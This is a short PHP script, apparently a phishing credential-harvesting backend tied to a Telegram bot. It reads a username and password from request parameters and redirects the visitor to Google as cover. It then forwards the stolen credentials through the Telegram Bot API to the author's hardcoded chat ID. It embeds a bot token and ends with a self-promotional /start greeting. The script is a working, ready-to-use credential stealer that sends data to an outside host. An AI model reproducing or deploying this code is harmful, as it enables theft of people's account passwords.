<?php
/*
  ___                   _         _ 
 | . \ ___  ___  ___  _| | ___  _| |
 |   // ._>/    / . \/ . |/ ._>/ . |
 |_\_\\___.\___ \___/\___|\___.\___|
Programmer(); 
@Lock_at_me_now                     
*/
ob_start();
$BOT_KEY = '394604313:AAHa9kRzybPoJoLMx6vFZIvk';/*TOKEN BOT*/
define('API_KEY',$BOT_KEY,0);
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}
$url1 = "https://Google.com"; /*Website Which the user moves to select for you*/
header("location: $url1");
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$from_id = $message->from->id;
$chat_id = $message->chat->id;
$text = $message->text;
$name = $message->from->first_name;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$idDome = 261608802;
$user = $_GET["user"];
$pass = $_GET["pass"];

if($user){
bot('sendMessage',[
'chat_id'=>$idDome,
'text'=>"_Username​: $user \n\n _Password​:  $pass \n @Lock_at_me_now ·-·-·",
]);
}
if($text == "/start"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"hello $name \n ABOUT MY :) \n name: ibrahim \n age: 19 \n from: iraq and now in Egypt :( \n  you can ask me anything..(); about Development :) ",
'reply_markup'=>json_encode([
      'inline_keyboard'=>[
        [
['text'=>'Recoded Shecksper', 'url'=>"https://telegram.me/lock_at_me_now"] 
],
[
[
'text'=>'Channel',
'url'=>'https://telegram.me/babeleon_bot'
]
]
]
])
]);
}
